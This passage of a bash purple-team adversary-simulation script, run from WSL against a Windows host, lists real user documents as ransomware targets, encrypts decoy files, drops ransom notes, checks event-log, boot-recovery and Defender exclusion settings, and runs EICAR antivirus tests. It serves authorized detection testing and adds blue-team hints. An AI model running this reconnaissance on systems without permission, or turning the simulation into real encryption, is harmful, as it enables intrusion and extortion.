    local target_extensions=("*.docx" "*.xlsx" "*.pdf" "*.jpg" "*.png" "*.pptx" "*.zip" "*.mdb" "*.accdb" "*.pst" "*.bak" "*.sql")
    local target_count=0

    for ext in "${target_extensions[@]}"; do
        for location in "$WINDOWS_SYSTEM/Users/*/Documents" "$WINDOWS_SYSTEM/Users/*/Desktop" "$WINDOWS_SYSTEM/Users/*/Downloads"; do
            if [ -d "$location" ] 2>/dev/null; then
                while IFS= read -r file; do
                    printf '    %s  [TARGET] %s\n' "$B_V" "$file" >> "$LOG_FILE"
                    ((target_count++))
                done < <(safe_find "$location" "$ext" 10)
            fi
        done
    done

    {
        printf '    %s\n' "$B_V"
        printf '    %s  Real targets found: %d files\n' "$B_V" "$target_count"
        printf '    %s\n' "$B_BL$B_H"
    } >> "$LOG_FILE"

    if [ $target_count -gt 0 ]; then
        print_success "Identified $target_count real files (NOT encrypting these)" "T1486"
    else
        print_info "No target files found on Windows filesystem"
    fi

    # --- Ransomware Simulation: Build, Encrypt, Ransom Note ---
    printf '\n'
    printf '  %b── Ransomware Encryption Simulation ──%b\n\n' "$C_MAGENTA" "$C_RESET"

    if [ -d "$RANSOM_SIM_DIR" ]; then
        print_warning "Previous simulation exists — removing before fresh run"
        rm -rf "$RANSOM_SIM_DIR"
    fi
    mkdir -p "$RANSOM_SIM_DIR"

    build_corporate_directory_tree "$RANSOM_SIM_DIR"
    encrypt_simulation_files "$RANSOM_SIM_DIR"
    drop_ransom_notes "$RANSOM_SIM_DIR"

    # Show the encrypted directory tree
    ((TOTAL_ACTIONS++))
    print_action "Post-encryption directory state:"
    local enc_tree
    enc_tree=$(find "$RANSOM_SIM_DIR" -type f ! -name ".*" | sed "s|$RANSOM_SIM_DIR/||" | sort)
    while IFS= read -r line; do
        print_detail "$line"
    done <<< "$enc_tree"

    {
        printf '\n    %s Post-Encryption Directory Listing\n' "$B_TL$B_H"
        printf '%s\n' "$enc_tree" | sed "s/^/    $B_V  /"
        printf '    %s\n' "$B_BL$B_H"
    } >> "$LOG_FILE"
    print_success "Encryption simulation complete" "T1486"

    # Event log clearing capability check
    execute_ps \
        "Get-WinEvent -ListLog Security,System,Application -ErrorAction SilentlyContinue | Select-Object LogName,RecordCount,MaximumSizeInBytes | Format-Table" \
        "T1070.001" \
        "Event log sizes (clearing impact assessment)"

    # Boot / recovery config
    execute_ps \
        "bcdedit /enum 2>\$null | Select-Object -First 20; Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SafeBoot' -ErrorAction SilentlyContinue | Format-List" \
        "T1490" \
        "Boot configuration and recovery options"

    # Mapped drives
    execute_ps \
        "Get-PSDrive -PSProvider FileSystem | Where-Object {\$_.Root -match '\\\\\\\\' } | Select-Object Name,Root,Used,Free | Format-Table" \
        "T1486" \
        "Network drives (lateral encryption targets)"

    printf '\n'
    print_warning "Impact simulation complete"
    print_info "Files encrypted in: $RANSOM_SIM_DIR"
    print_info "Decrypt:  $0 --decrypt"
    print_info "Cleanup:  $0 --cleanup"

    end_phase
}

# ============================================================================
# PHASE 11: EICAR AV DETECTION TEST
# Test antivirus detection using the safe EICAR test file
# ============================================================================

phase_eicar_test() {
    begin_phase 11 "EICAR AV Detection Test" "AV-TEST" \
        "Test antivirus detection with the safe, industry-standard EICAR test string"

    print_warning "EICAR is a SAFE, industry-standard test file — NOT malware"
    printf '\n'

    local eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

    {
        printf '    %s EICAR AV Detection Test\n' "$B_TL$B_H"
        printf '    %s  NOTE: EICAR is a SAFE, industry-standard test file\n' "$B_V"
        printf '    %s  Time: %s\n' "$B_V" "$(_log_ts)"
        printf '    %s\n' "$B_V"
    } >> "$LOG_FILE"

    # Test 1: EICAR in WSL filesystem
    ((TOTAL_ACTIONS++))
    print_action "Creating EICAR test file in WSL filesystem..."
    local eicar_tmp
    eicar_tmp="/tmp/eicar_test_$(date +%Y%m%d_%H%M%S).com"

    if echo "$eicar" > "$eicar_tmp" 2>/dev/null; then
        if [ -f "$eicar_tmp" ]; then
            print_success "EICAR created in WSL: $eicar_tmp" "AV-TEST"
            printf '    %s  [WSL] Created: %s at %s\n' "$B_V" "$eicar_tmp" "$(_log_ts)" >> "$LOG_FILE"
            sleep 2
            if [ -f "$eicar_tmp" ]; then
                print_warning "EICAR still exists — AV may not be monitoring WSL filesystem"
                printf '    %s  [WSL] File persists at %s — possible AV gap\n' "$B_V" "$(_log_ts)" >> "$LOG_FILE"
                print_finding "MEDIUM" "AV not monitoring WSL filesystem"
            else
                print_success "EICAR deleted by AV — WSL filesystem is monitored" "AV-TEST"
                printf '    %s  [WSL] File deleted by AV at %s\n' "$B_V" "$(_log_ts)" >> "$LOG_FILE"
                print_finding "INFO" "AV actively monitoring WSL filesystem"
            fi
        fi
    else
        print_success "EICAR blocked immediately in WSL — AV is active" "AV-TEST"
        printf '    %s  [WSL] Blocked immediately at %s\n' "$B_V" "$(_log_ts)" >> "$LOG_FILE"
    fi

    # Test 2: EICAR on Windows filesystem
    ((TOTAL_ACTIONS++))
    print_action "Creating EICAR test file on Windows filesystem..."
    local eicar_win="$WINDOWS_SYSTEM/Users/Public/Documents/eicar_test.com"

    if echo "$eicar" > "$eicar_win" 2>/dev/null; then
        sleep 1
        if [ -f "$eicar_win" ]; then
            print_warning "EICAR persists on Windows — AV may be inactive" "AV-TEST"
            printf '    %s  [WINDOWS] File persists at %s — AV may be disabled\n' "$B_V" "$(_log_ts)" >> "$LOG_FILE"
            print_finding "HIGH" "AV not blocking EICAR on Windows filesystem"
            rm -f "$eicar_win" 2>/dev/null
        else
            print_success "EICAR deleted from Windows — AV is active" "AV-TEST"
            printf '    %s  [WINDOWS] File deleted by AV at %s\n' "$B_V" "$(_log_ts)" >> "$LOG_FILE"
        fi
    else
        print_success "EICAR blocked on Windows filesystem — AV is active" "AV-TEST"
        printf '    %s  [WINDOWS] Blocked immediately at %s\n' "$B_V" "$(_log_ts)" >> "$LOG_FILE"
    fi

    # Test 3: Multiple file extensions
    print_action "Testing EICAR with various file extensions..."
    ((TOTAL_ACTIONS++))

    local extensions=("txt" "exe" "com" "bat" "ps1" "js" "vbs" "hta")
    local detected=0 missed=0

    for ext in "${extensions[@]}"; do
        local test_file="/tmp/eicar_test.$ext"
        echo "$eicar" > "$test_file" 2>/dev/null
        sleep 1
        if [ -f "$test_file" ]; then
            printf '    %s  [.%s] NOT detected at %s\n' "$B_V" "$ext" "$(_log_ts)" >> "$LOG_FILE"
            ((missed++))
            rm -f "$test_file" 2>/dev/null
        else
            printf '    %s  [.%s] Detected and removed at %s\n' "$B_V" "$ext" "$(_log_ts)" >> "$LOG_FILE"
            ((detected++))
        fi
    done

    {
        printf '    %s\n' "$B_V"
        printf '    %s  Detection Summary at %s:\n' "$B_V" "$(_log_ts)"
        printf '    %s    Detected: %d/%d\n' "$B_V" "$detected" "${#extensions[@]}"
        printf '    %s    Missed:   %d/%d\n' "$B_V" "$missed" "${#extensions[@]}"
        printf '    %s\n' "$B_BL$B_H"
    } >> "$LOG_FILE"

    if [ $detected -eq ${#extensions[@]} ]; then
        print_success "AV detected all $detected EICAR file variations" "AV-TEST"
    elif [ $detected -gt 0 ]; then
        print_warning "AV detected $detected/${#extensions[@]} EICAR variations — gaps exist"
        print_finding "MEDIUM" "AV missed ${missed} out of ${#extensions[@]} file extension tests"
    else
        print_error "AV did not detect any EICAR files — AV may not be active" "AV-TEST"
        print_finding "HIGH" "No AV detection of any EICAR test file"
    fi

    # Defender configuration
    execute_ps \
        "Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AntivirusEnabled,AMServiceEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,OnAccessProtectionEnabled | Format-List" \
        "AV-TEST" \
        "Windows Defender status"

    execute_ps \
        "Get-MpPreference -ErrorAction SilentlyContinue | Select-Object DisableRealtimeMonitoring,DisableBehaviorMonitoring,DisableBlockAtFirstSeen,DisableIOAVProtection | Format-List" \
        "AV-TEST" \
        "Windows Defender preferences (disabled features)"

    # Exclusion paths (attackers add exclusions to evade)
    execute_ps \
        "Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue" \
        "T1562.001" \
        "Defender exclusion paths (evasion surface)"

    end_phase
}

# ============================================================================
# HELP AND USAGE
# ============================================================================

show_help() {
    printf '%b' "$C_CYAN"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════════════╗
║                     PURPLE TEAM AGENT v4.2                               ║
║          Advanced Adversary Simulation — Financial / Gov Sector          ║
╚══════════════════════════════════════════════════════════════════════════╝
EOF
    printf '%b' "$C_RESET"
    printf '\n'
    printf '%b%s%b\n' "$C_WHITE" "USAGE:" "$C_RESET"
    printf '    %s [OPTIONS]\n' "$0"
    printf '\n'
    printf '%b%s%b\n' "$C_WHITE" "OPTIONS:" "$C_RESET"
    printf '    %b-h, --help%b              Show this help message\n' "$C_GREEN" "$C_RESET"
    printf '    %b-a, --all%b               Run all phases (default)\n' "$C_GREEN" "$C_RESET"
    printf '    %b-p, --phase <N[,N]>%b     Run specific phase(s) (1-11)\n' "$C_GREEN" "$C_RESET"
    printf '    %b-l, --list%b              List available phases\n' "$C_GREEN" "$C_RESET"
    printf '    %b-q, --quiet%b             Minimal terminal output\n' "$C_GREEN" "$C_RESET"
    printf '    %b-v, --verbose%b           Verbose / debug output\n' "$C_GREEN" "$C_RESET"
    printf '    %b--decrypt%b               Decrypt files from Phase 10 simulation\n' "$C_YELLOW" "$C_RESET"
    printf '    %b--cleanup%b               Remove all simulation artifacts\n' "$C_YELLOW" "$C_RESET"
    printf '\n'
    printf '%b%s%b\n' "$C_WHITE" "PHASES:" "$C_RESET"
    printf '    %bPhase  1%b — System & Environment Profiling     (T1082, T1497, T1614)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase  2%b — Account & Privilege Discovery      (T1087, T1069, T1201)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase  3%b — Process & Service Intelligence     (T1057, T1007, T1518)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase  4%b — Sensitive File Discovery           (T1083, T1005, T1552)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase  5%b — Credential Access Reconnaissance   (T1555, T1003, T1552)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase  6%b — Defense Evasion Reconnaissance     (T1562, T1218, T1027)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase  7%b — Network & Lateral Movement Recon   (T1049, T1018, T1482)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase  8%b — Collection & Staging               (T1119, T1074, T1114)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase  9%b — Persistence Mechanism Recon        (T1547, T1053, T1546)\n' "$C_CYAN" "$C_RESET"
    printf '    %bPhase 10%b — Ransomware Simulation (Reversible) (T1486, T1490, T1489)\n' "$C_MAGENTA" "$C_RESET"
    printf '    %bPhase 11%b — EICAR AV Detection Test            (AV-TEST, T1562)\n' "$C_CYAN" "$C_RESET"
    printf '\n'
    printf '%b%s%b\n' "$C_WHITE" "EXAMPLES:" "$C_RESET"
    printf '    %s --all                 # Run all phases\n' "$0"
    printf '    %s --phase 1             # System profiling only\n' "$0"
    printf '    %s --phase 5,6,7         # Credentials, defenses, network\n' "$0"
    printf '    %s --phase 10            # Ransomware simulation only\n' "$0"
    printf '    %s --decrypt             # Reverse Phase 10 encryption\n' "$0"
    printf '    %s --cleanup             # Remove all simulation data\n' "$0"
    printf '    %s --list                # Show phase details\n' "$0"
    printf '\n'
    printf '%b%s%b\n' "$C_WHITE" "OUTPUT:" "$C_RESET"
    printf '    Terminal:   Colour-coded with findings severity\n'
    printf '    Text Log:   /tmp/purpleteam_<timestamp>.log\n'
    printf '    JSON Log:   /tmp/purpleteam_<timestamp>.json\n'
    printf '\n'
    printf '%b%s%b\n' "$C_YELLOW" "  FOR AUTHORIZED PURPLE TEAM EXERCISES ONLY" "$C_RESET"
    printf '\n'
}

list_phases() {
    printf '%b' "$C_CYAN"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════════════╗
║                        AVAILABLE PHASES                                  ║
╚══════════════════════════════════════════════════════════════════════════╝
EOF
    printf '%b\n' "$C_RESET"

    local phases=(
        "1|System & Environment Profiling|T1082, T1497.001, T1614, T1614.001|Fingerprint OS, hardware, VM detection, security stack, locale|~20s"
        "2|Account & Privilege Discovery|T1087, T1069, T1201, T1033|Local/domain users, groups, password policy, admin enum|~25s"
        "3|Process & Service Intelligence|T1057, T1007, T1518.001, T1497.001|Running processes, security tools, financial apps, analysis tools|~20s"
        "4|Sensitive File Discovery|T1083, T1005, T1552.001, T1552.004|Documents, certs, keys, configs, password DBs, RDP files|~30s"
        "5|Credential Access Reconnaissance|T1552, T1555, T1003, T1552.006|Browser creds, Credential Manager, LSASS, SAM, cloud tokens|~35s"
        "6|Defense Evasion Reconnaissance|T1562, T1218, T1027|PS logging, Sysmon, firewall, AppLocker, AMSI, audit policy|~25s"
        "7|Network & Lateral Movement Recon|T1049, T1018, T1135, T1482, T1016|Connections, shares, routing, domain trusts, RDP history|~30s"
        "8|Collection & Staging|T1119, T1074.001, T1114.001, T1005|Stage documents, email archives, clipboard, recent files|~25s"
        "9|Persistence Mechanism Recon|T1547, T1053, T1543, T1546, T1574|Run keys, tasks, services, WMI, COM hijack, DLL search order|~25s"
        "10|Ransomware Simulation (Reversible)|T1486, T1490, T1489, T1529|Create/encrypt fake corporate files, drop ransom notes, --decrypt to reverse|~35s"
        "11|EICAR AV Detection Test|AV-TEST, T1562.001|Test AV with safe EICAR string across WSL/Windows and multiple extensions|~25s"
    )

    for entry in "${phases[@]}"; do
        IFS='|' read -r num title techniques desc duration <<< "$entry"
        local color="$C_GREEN"
        [ "$num" = "10" ] && color="$C_MAGENTA"
        [ "$num" = "11" ] && color="$C_CYAN"
        printf '  %b[%2s]%b  %b%s%b\n' "$C_WHITE" "$num" "$C_RESET" "$color" "$title" "$C_RESET"
        printf '       MITRE ATT&CK: %s\n' "$techniques"
        printf '       %s\n' "$desc"
        printf '       Duration: %s\n\n' "$duration"
    done

    printf '  %bTotal estimated time for all phases: ~6-7 minutes%b\n\n' "$C_GRAY" "$C_RESET"
}

# ============================================================================
# BANNER
# ============================================================================

show_banner() {
    clear
    printf '%b' "$C_CYAN"
    cat << "EOF"
    ╔═══════════════════════════════════════════════════════════════════╗
    ║                                                                   ║
    ║   ██████╗ ██╗   ██╗██████╗ ██████╗ ██╗     ███████╗              ║
    ║   ██╔══██╗██║   ██║██╔══██╗██╔══██╗██║     ██╔════╝              ║
    ║   ██████╔╝██║   ██║██████╔╝██████╔╝██║     █████╗                ║
    ║   ██╔═══╝ ██║   ██║██╔══██╗██╔═══╝ ██║     ██╔══╝                ║
    ║   ██║     ╚██████╔╝██║  ██║██║     ███████╗███████╗              ║
    ║   ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝╚══════╝              ║
    ║                                                                   ║
    ║   ████████╗███████╗ █████╗ ███╗   ███╗                           ║
    ║   ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║                           ║
    ║      ██║   █████╗  ███████║██╔████╔██║                           ║
    ║      ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║                           ║
    ║      ██║   ███████╗██║  ██║██║ ╚═╝ ██║                           ║
    ║      ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝                           ║
    ║                                                                   ║
    ║            Advanced Adversary Simulation Framework                ║
    ║                    WSL → Windows Host                            ║
    ║             Financial / Government Sector TTPs                   ║
    ║                                                                   ║
    ╚═══════════════════════════════════════════════════════════════════╝
EOF
    printf '%b' "$C_RESET"
    printf '    %bVersion:%b  %b%s%b\n' "$C_WHITE" "$C_RESET" "$C_CYAN" "$SCRIPT_VERSION" "$C_RESET"
    printf '    %bTarget:%b   %bWindows Host via WSL%b\n' "$C_WHITE" "$C_RESET" "$C_CYAN" "$C_RESET"
    printf '    %bFocus:%b    %bFinancial & Government Sector APT TTPs%b\n' "$C_WHITE" "$C_RESET" "$C_CYAN" "$C_RESET"
    printf '    %bPurpose:%b  %bAuthorized Purple Team Exercise%b\n' "$C_WHITE" "$C_RESET" "$C_CYAN" "$C_RESET"
    printf '\n'
    printf '    %b⚠  FOR AUTHORIZED SECURITY TESTING ONLY  ⚠%b\n\n' "$C_YELLOW" "$C_RESET"

    init_logs
}

# ============================================================================
# SUMMARY
# ============================================================================

generate_summary() {
    local end_time duration minutes seconds
    end_time=$(date +%s)
    duration=$((end_time - START_TIME))
    minutes=$((duration / 60))
    seconds=$((duration % 60))

    printf '\n'
    printf '%b╔═══════════════════════════════════════════════════════════════════════╗%b\n' "$C_CYAN" "$C_RESET"
    printf '%b║%b                       %bEXECUTION SUMMARY%b                              %b║%b\n' "$C_CYAN" "$C_RESET" "$C_WHITE" "$C_RESET" "$C_CYAN" "$C_RESET"
    printf '%b╚═══════════════════════════════════════════════════════════════════════╝%b\n' "$C_CYAN" "$C_RESET"
    printf '\n'
    printf '  %-20s %dm %ds\n' "Duration:" "$minutes" "$seconds"
    printf '  %-20s %d\n' "Total Actions:" "$TOTAL_ACTIONS"
    printf '  %b%-20s%b %d\n' "$C_GREEN" "Successful:" "$C_RESET" "$SUCCESSFUL_ACTIONS"
    printf '  %b%-20s%b %d\n' "$C_RED" "Failed:" "$C_RESET" "$FAILED_ACTIONS"
    printf '  %b%-20s%b %d\n' "$C_YELLOW" "Skipped:" "$C_RESET" "$SKIPPED_ACTIONS"

    if [ $TOTAL_ACTIONS -gt 0 ]; then
        local success_rate
        success_rate=$(awk "BEGIN {printf \"%.1f\", ($SUCCESSFUL_ACTIONS/$TOTAL_ACTIONS)*100}")
        printf '  %-20s %s%%\n' "Success Rate:" "$success_rate"
    fi

    printf '\n'
    printf '  %b── Output Files ──%b\n' "$C_WHITE" "$C_RESET"
    printf '  Text Log:    %s\n' "$LOG_FILE"
    printf '  JSON Log:    %s\n' "$JSON_LOG"

    if [ -f "/tmp/RANSOMWARE_NOTE_PURPLETEAM.txt" ]; then
        printf '  Ransom Note: /tmp/RANSOMWARE_NOTE_PURPLETEAM.txt\n'
    fi
    if ls -d /tmp/collected_data_* &>/dev/null 2>&1; then
        printf '  Staged Data: %s\n' "$(ls -d /tmp/collected_data_* 2>/dev/null | tail -1)"
    fi

    printf '\n'
    printf '  %b── Blue Team Detection Hints ──%b\n' "$C_WHITE" "$C_RESET"
    printf '\n'
    printf '  %bStandard Indicators:%b\n' "$C_WHITE" "$C_RESET"
    printf '    • PowerShell EventID 4104 (Script Block Logging)\n'
    printf '    • Process Creation EventID 4688 (WSL → PowerShell)\n'
    printf '    • File Access EventID 4663\n'
    printf '    • Registry Access EventID 4657\n'
    printf '    • Network Connection EventID 5156\n'
    printf '    • Logon EventID 4624/4625\n'
    printf '\n'
    printf '  %bAPT / Financial Sector Indicators:%b\n' "$C_WHITE" "$C_RESET"
    printf '    • LDAP queries for adminCount=1 (admin enumeration)\n'
    printf '    • Shadow copy enumeration (pre-ransomware)\n'
    printf '    • Credential store access attempts (browser DBs)\n'
    printf '    • Lateral movement recon (RDP history, SMB shares)\n'
    printf '    • WMI subscription queries (stealthy persistence)\n'
    printf '    • Service binary path enumeration (escalation)\n'
    printf '\n'

    {
        printf '\n'
        printf '  ══════════════════════════════════════════════════════════════════\n'
        printf '  EXECUTION SUMMARY\n'
        printf '  ══════════════════════════════════════════════════════════════════\n'
        printf '\n'
        printf '  Completed:    %s\n' "$(date '+%Y-%m-%d %H:%M:%S %Z')"
        printf '  Duration:     %dm %ds\n' "$minutes" "$seconds"
        printf '  Actions:      %d total | %d success | %d failed | %d skipped\n' \
            "$TOTAL_ACTIONS" "$SUCCESSFUL_ACTIONS" "$FAILED_ACTIONS" "$SKIPPED_ACTIONS"
        if [ $TOTAL_ACTIONS -gt 0 ]; then
            printf '  Success Rate: %s%%\n' "$(awk "BEGIN {printf \"%.1f\", ($SUCCESSFUL_ACTIONS/$TOTAL_ACTIONS)*100}")"
        fi
        printf '\n'
        printf '  Environment:\n'
        printf '    WSL Version:   %s\n' "$WSL_VERSION"
        printf '    PowerShell:    %s\n' "$POWERSHELL_CMD"
        printf '    Windows Mount: %s\n' "$WINDOWS_SYSTEM"
        printf '    Target Host:   %s\n' "${HOSTNAME_DETECTED:-unknown}"
        printf '    Target User:   %s\n' "${USERNAME_DETECTED:-unknown}"
        printf '\n'
        printf '  Output Files:\n'
        printf '    Text Log: %s\n' "$LOG_FILE"
        printf '    JSON Log: %s\n' "$JSON_LOG"
        printf '\n'
        printf '  ══════════════════════════════════════════════════════════════════\n'
    } >> "$LOG_FILE"

    # Finalize JSON
    printf '  {"summary":{"version":"%s","duration":%d,"total":%d,"successful":%d,"failed":%d,"skipped":%d}}\n]\n' \
        "$SCRIPT_VERSION" "$duration" "$TOTAL_ACTIONS" "$SUCCESSFUL_ACTIONS" "$FAILED_ACTIONS" "$SKIPPED_ACTIONS" >> "$JSON_LOG"

    printf '%b✓ Purple Team exercise completed%b\n\n' "$C_GREEN" "$C_RESET"
}

# ============================================================================
# MAIN
# ============================================================================

main() {
    local run_all=true
    local phases_to_run=()
    local quiet_mode=false

    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                show_help
                exit 0
                ;;
            -l|--list)
                list_phases
                exit 0
                ;;
            --decrypt)
                decrypt_ransomware_simulation
                exit 0
                ;;
            --cleanup)
                cleanup_ransomware_simulation
                exit 0
                ;;
            -a|--all)
                run_all=true
                shift
                ;;
            -p|--phase)
                run_all=false
                IFS=',' read -ra phases_to_run <<< "$2"
                shift 2
                ;;
            -q|--quiet)
                quiet_mode=true
                shift
                ;;
            -v|--verbose)
                set -x
                shift
                ;;
            *)
                printf '%b%s%b\n' "$C_RED" "Unknown option: $1" "$C_RESET"
                printf 'Use --help for usage information\n'
                exit 1
                ;;
        esac
    done

    if [ "$quiet_mode" = false ]; then
        show_banner
        sleep 1
    else
        init_logs
    fi

    detect_environment
    sleep 1

    if [ "$run_all" = true ]; then
        phase_system_discovery;       sleep 1
        phase_account_discovery;      sleep 1
        phase_process_discovery;      sleep 1
        phase_file_discovery;         sleep 1
        phase_credential_search;      sleep 1
        phase_defense_evasion_recon;  sleep 1
        phase_network_discovery;      sleep 1
        phase_automated_collection;   sleep 1
        phase_persistence_recon;      sleep 1
        phase_impact_simulation;      sleep 1
        phase_eicar_test;             sleep 1
    else
        for phase in "${phases_to_run[@]}"; do
            case $phase in
                1)  phase_system_discovery ;;
                2)  phase_account_discovery ;;
                3)  phase_process_discovery ;;
                4)  phase_file_discovery ;;
                5)  phase_credential_search ;;
                6)  phase_defense_evasion_recon ;;
                7)  phase_network_discovery ;;
                8)  phase_automated_collection ;;
                9)  phase_persistence_recon ;;
                10) phase_impact_simulation ;;
                11) phase_eicar_test ;;
                *)
                    print_error "Invalid phase number: $phase (valid range: 1-11)"
                    ;;
            esac
            sleep 1
        done
    fi

    generate_summary
}

# ============================================================================
# ERROR HANDLING
# ============================================================================

trap 'print_error "Script interrupted by user"; generate_summary; exit 1' INT TERM

# ============================================================================
# ENTRY POINT
# ============================================================================

main "$@"
exit 0
